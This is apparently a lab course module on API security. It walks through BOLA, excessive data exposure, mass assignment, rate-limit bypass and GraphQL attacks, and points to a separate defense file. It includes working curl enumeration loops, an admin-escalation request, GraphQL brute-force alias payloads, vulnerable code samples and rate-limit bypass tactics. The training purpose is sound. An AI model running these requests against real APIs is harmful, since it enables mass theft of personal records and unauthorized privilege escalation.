# Week 13: Attack walkthrough — API Security (REST + GraphQL)

> ⚠️ **Lab only.**

---

## Why APIs deserve their own week

The web app you tested in weeks 1-12 had one front door: the browser. An API has many — mobile app, partner integration, internal microservice, third-party developer, CI scripts. Each calls the same endpoints with different assumptions about who's authorized. **The single biggest API bug class — BOLA — is "the server forgot to check ownership."** It dominates breach reports because it's invisible from the browser-UI side: the mobile app would never request someone else's ID, so the missing check looks fine in production until someone changes the ID in Burp.

OWASP maintains a separate [API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) because the bug distribution is genuinely different from the regular Top 10. We'll walk the dominant five.

## Part 1: BOLA — Broken Object-Level Authorization (API1)

### The pattern

```python
@app.route("/api/orders/<order_id>")
def get_order(order_id):
    order = Order.query.get(order_id)
    return jsonify(order.to_dict())
```

The endpoint authenticates (you have a valid JWT) but doesn't authorize (it never checks that `order.owner_id == current_user.id`). Any logged-in user can fetch any order.

This is just Week 03's IDOR — but at API scale, where every record is a numeric/UUID ID and there are thousands of endpoints.

### Step 1: Find an object-ID endpoint

In Burp, browse normally. Watch for:

```
GET /api/users/42/profile
GET /api/orders/12345
GET /api/vehicles/VIN/maintenance
PUT /api/posts/9876
DELETE /api/comments/55
```

Any URL with an integer, UUID, slug, or other identifier that names a specific resource.

### Step 2: Change the ID

In crAPI: log in as User A, visit your vehicle, capture the request:

```
GET /identity/api/v2/vehicle/<your-uuid>/location
Authorization: Bearer <user-A-jwt>
```

Now log in as User B in a private window. Get their vehicle UUID. In Burp Repeater, change the UUID in User A's authenticated request to User B's UUID:

```
GET /identity/api/v2/vehicle/<user-B-uuid>/location
Authorization: Bearer <user-A-jwt>
```

If you get User B's vehicle location while authenticated as User A → BOLA.

### Step 3: Enumerate at scale

The proof-of-concept reads one record. The exploit reads them all:

```bash
# Burp Intruder over a UUID list, or curl loop:
for id in $(cat all_uuids.txt); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "http://localhost:8888/identity/api/v2/vehicle/$id/location" \
    | jq '. + {id: "'$id'"}'
done
```

Numeric IDs are worse — you don't even need a list:

```bash
for i in $(seq 1 100000); do
  curl -s -H "Authorization: Bearer $TOKEN" "http://target/api/orders/$i"
done
```

100,000 records exfiltrated in minutes. This is the real impact.

### Step 4: Predict the IDs

UUIDs feel safer than integers but aren't. Recall Week 10: `uuid.uuid4()` is CSPRNG, but if the app uses `uuid.uuid1()` (timestamp-based) or any pseudo-random scheme, IDs are predictable.

```python
# uuid1 leaks MAC + timestamp. Field layout (RFC 4122):
#   time_low - time_mid - time_hi_and_version - clock_seq - node(MAC)
>>> uuid.uuid1()
UUID('1e6d5c80-1d8f-11ef-8c12-aabbccddeeff')
#     ────────  ────  ────  ──── ────────────
#     time_low  mid   hi    clk  node = host MAC (48 bits)
```

The `time_*` fields encode 100-ns ticks since 1582-10-15 — given one UUID, you know the host's clock state. The `node` field is the host MAC (or a random one if the host doesn't expose one, depending on platform). See the [Python `uuid` module docs](https://docs.python.org/3/library/uuid.html). Predictable IDs let you skip enumeration: compute the next ID from the timestamp.

### Real-world BOLA

- **Peloton (2021)** — anyone could query any user's location, weight, age via a BOLA on the API.
- **USPS (2018)** — 60 million users' addresses queryable via the Informed Visibility API, no auth check beyond "you have an account."
- **Parler (2021)** — sequential post IDs let researchers scrape the entire site after the company exposed an unauthenticated metadata endpoint.

## Part 2: BOPLA — Broken Object-Property-Level Authorization (API3)

The cousin of BOLA. You're allowed to access the object, but the API returns fields you shouldn't see.

```python
@app.route("/api/users/<user_id>")
def get_user(user_id):
    user = User.query.get(user_id)
    return jsonify(user.to_dict())  # to_dict() includes password_hash, ssn, internal_notes
```

You request your own profile and get your full record — including server-side fields the UI never displays.

### Step 1: Look at the JSON

In Burp, every response is JSON. Read it. The UI shows your name and email; the API response includes:

```json
{
  "id": 42,
  "email": "you@example.com",
  "name": "You",
  "phone": "555-1234",
  "ssn_last_4": "1234",
  "internal_risk_score": 0.87,
  "stripe_customer_id": "cus_xxxxx",
  "is_admin": false,
  "password_hash": "$2b$12$...",
  "totp_secret": "JBSWY3DPEHPK3PXP"
}
```

The UI never shows `password_hash` or `totp_secret`, but the API returns them. Mobile/SDK clients often pull more than the web UI displays.

### Step 2: Confirm and weaponize

- `totp_secret` → you can generate TOTP codes for the victim (skip 2FA in [Week 04](../week-04-auth-failures/)).
- `password_hash` → offline crack ([Week 10](../week-10-crypto-failures/)).
- `stripe_customer_id` → social-engineering hook for billing impersonation.
- `internal_risk_score` → reveals fraud-detection thresholds; useful for bypass.

### Step 3: BOPLA on writes (mass assignment, API6)

The write-side of BOPLA — sending fields the client shouldn't be allowed to set:

```http
PUT /api/users/42 HTTP/1.1
Content-Type: application/json

{"name": "You", "email": "you@example.com", "is_admin": true}
```

If the server blindly binds JSON to the model:

```python
# Vulnerable
@app.route("/api/users/<id>", methods=["PUT"])
def update_user(id):
    user = User.query.get(id)
    for key, value in request.json.items():
        setattr(user, key, value)
    db.session.commit()
```

You just made yourself admin. Same patterns in Rails (`User.new(params[:user])` without `strong_parameters`), Spring (`@ModelAttribute` without `@JsonIgnore`), Django (`ModelForm.Meta.fields = "__all__"`).

### Step 4: Field-discovery via error messages

When the server hides the schema, error messages often leak it:

```http
PUT /api/users/42 {"foo": "bar"}
HTTP/1.1 400 Bad Request
{"error": "Unknown field 'foo'. Allowed: id, email, name, is_admin, is_staff, ..."}
```

Sometimes you get the full field list for free. Even when you don't:

```http
PUT /api/users/42 {"is_admin": "not_a_bool"}
HTTP/1.1 400 {"error": "is_admin must be boolean"}
```

The 400 implicitly confirms `is_admin` is a real field. Now try `{"is_admin": true}`.

## Part 3: Missing or insufficient rate limits (API4)

### Where rate limits matter

Most security guidance treats rate limits as DoS protection. In API security they're auth-protection:

| Endpoint | Why rate limit matters |
|---|---|
| `POST /login` | Credential stuffing ([Week 04](../week-04-auth-failures/)) |
| `POST /password-reset` | Enumerate registered emails |
| `POST /verify-otp` | Brute-force the 6-digit code |
| `GET /api/users/<id>` | BOLA enumeration |
| `POST /api/coupon/redeem` | Coupon brute force |
| `POST /api/sms-otp` | Toll-fraud (each SMS costs you money) |
| `GET /api/.well-known/openid-configuration` | Service enumeration (low risk) |

### Step 1: Fire 1000 requests fast

In Burp Repeater → "Send 1000". Watch for:

- All return 200 → no rate limit at all
- Returns 200 for a while then 429 → rate limit exists; note the threshold
- Returns 200 forever per-IP, but per-account it errors out → only account-level limit; per-IP not enforced

Rate limits should be **multi-dimensional**: per-IP, per-account, per-endpoint, per-key. Most apps get one of these and miss the rest.

### Step 2: Bypasses

| Limit dimension | Bypass |
|---|---|
| Per-IP | Rotate IPs (Burp + proxy chain, or just curl through ec2 nodes — easy and not bot-like) |
| Per-account | Many accounts (signup spam first) |
| Per-X-Forwarded-For | Spoof the header — many apps trust it directly |
| Per-User-Agent | Vary UA |
| Per-cookie | Clear cookies between requests |

### Step 3: The Instagram SMS-OTP case (Laxman Muthiyah)

OTPs were 6 digits → 1,000,000 codes. Per-account limit was triggered after a few tries — but per-IP limit was not enforced. With distributed IPs (1,000 distinct cloud hosts × 1,000 attempts each), the entire keyspace was covered in minutes. Bounty: $30,000. Writeup: [thezerohack.com](https://thezerohack.com/hack-any-instagram).

The lesson: **a rate limit applied at only one dimension is no rate limit at all**.

## Part 4: GraphQL specifics

GraphQL replaces a fleet of REST endpoints with one endpoint that accepts a query language. Every REST bug class still applies, plus:

### Step 1: Introspection

Ask the server "what queries do you support?":

```http
POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "{__schema{types{name,fields{name,type{name}}}}}"}
```

If introspection is on, you get the full schema. Now you know every type, field, argument. This is the GraphQL equivalent of finding `/api/swagger.json` exposed.

Even if `__schema` is blocked, **field suggestions** often leak:

```
POST /graphql
{"query": "{ user(id: 1) { secrtKey } }"}
=> "Cannot query field 'secrtKey'. Did you mean 'secretKey'?"
```

The error reveals `secretKey` exists. Repeated probing rebuilds the schema piece by piece. PortSwigger's "Bypassing GraphQL brute force protections" lab shows this directly.

### Step 2: Authorization bypass through GraphQL

REST endpoints often check auth at the URL route. GraphQL has one URL — `/graphql`. Auth check is per-resolver. If a resolver is missed, the field is accessible:

```graphql
{
  user(id: 42) {
    name      # has auth check
    email     # has auth check
    posts {   # has auth check
      id
      title
      draftBody  # forgotten resolver — no check
    }
  }
}
```

PortSwigger's "Accidental exposure of private GraphQL fields" lab is this exact pattern.

### Step 3: Query-depth DoS

GraphQL lets you nest:

```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends { ... }    # 10 levels deep
        }
      }
    }
  }
}
```

10 levels × 100 friends each = 10^20 work. Each level may hit the database. Without depth limits the server falls over.

### Step 4: Alias-based brute force

REST sends one request, gets rate-limited after N tries. GraphQL lets you batch via **aliases**:

```graphql
{
  try1: login(user: "alice", pass: "p1")
  try2: login(user: "alice", pass: "p2")
  try3: login(user: "alice", pass: "p3")
  ...
  try1000: login(user: "alice", pass: "p1000")
}
```

One HTTP request. Most rate limiters that count "requests per minute" count *HTTP* requests, not resolver invocations. PortSwigger's "Bypassing GraphQL brute force protections" lab is exactly this.

### Step 5: Batched queries (separate from aliasing)

Some servers also accept arrays of operations:

```json
[{"query": "{login(...)}"}, {"query": "{login(...)}"}, ...]
```

Same trick, different syntax. Disable batching unless you actually need it.

### Step 6: Mutations leaking via cache poisoning

Apollo's automatic persisted queries (APQ) cache *queries* by hash so clients can send a short hash instead of the full query text. That cache, by itself, is just a query lookup — not a response cache, and not a vulnerability.

The danger appears when a team layers a **response cache** on top (Apollo's `responseCachePlugin`, a CDN edge cache in front of `/graphql`, or a custom Redis layer) and the cache key isn't scoped to the requesting user. One user's authorized response gets served to another user who replays the same APQ hash. The default Apollo server does not have this bug; custom response caches frequently do.

Audit: search your codebase for `responseCachePlugin`, CDN cache rules in front of `/graphql`, or hand-rolled caches keyed only on query hash / variables. If user identity isn't in the cache key, it's exploitable.

## Part 5: BOLA in JWTs (API2)

A JWT contains user identity in its claims. If the server reads the user from the URL/body *instead of the JWT*, you get BOLA:

```
GET /api/users/<id_in_url>/profile
Authorization: Bearer <token-with-claim-sub-equals-7>
```

Server returns the user named in the URL. The JWT claim says you're user 7, but the URL says user 42 — and the server trusts the URL. This pattern is depressingly common.

The fix: every endpoint that takes a user-scoped ID should compare it to `request.user.id` from the JWT, not trust the URL parameter as identity.

## Common mistakes when learning

- **Stopping at "I changed one ID and got data."** That's the demo. The exploit is enumeration at scale.
- **Not checking error messages.** They leak field names, validation rules, library versions.
- **Treating GraphQL like a black box.** Run introspection first. The schema *is* the attack map.
- **Forgetting BOPLA on writes.** Reading extra fields is one bug class; *writing* them is the privilege-escalation one.
- **Trusting "the UI doesn't show that field."** The UI doesn't matter; the API does.

Now read [defense.md](defense.md).
